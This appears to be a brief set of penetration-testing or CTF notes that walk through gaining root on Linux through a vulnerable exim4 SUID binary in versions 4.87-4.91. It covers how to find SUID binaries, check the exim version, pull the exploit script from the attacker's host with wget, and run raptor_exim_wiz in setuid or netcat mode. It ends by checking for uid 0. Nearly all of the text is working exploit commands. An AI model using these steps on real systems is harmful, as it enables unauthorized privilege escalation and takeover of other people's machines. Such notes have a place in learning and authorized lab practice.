if exim4 is within the suid binaries (find / -perm -u=s -type f 2>/dev/null)

then check what version by entering /usr/sbin/exim4 --version

if it is within 4.87-4.91 you can priv esc with it

https://www.exploit-db.com/exploits/46996 for reference

wget this onto the target machine using: wget http://(yourhostip)/exim4.sh

change the name to raptor_exim_wiz(not necessary) with mv exim4.sh raptor_exim_wiz

this is where the priv esc happens!!!!

./raptor_exim_wiz -m setuid

if this doesnt give you root check to see if the box has netcat by entering which nc

if it does 

./raptor_exim_wiz -m netcat

this might not show you as root or show a # but if you get this localhost [127.0.0.1] 31337 (?) open

enter id and it should have uid=0(root) gid=0(root) groups=0(root)

you should now have root!!!!
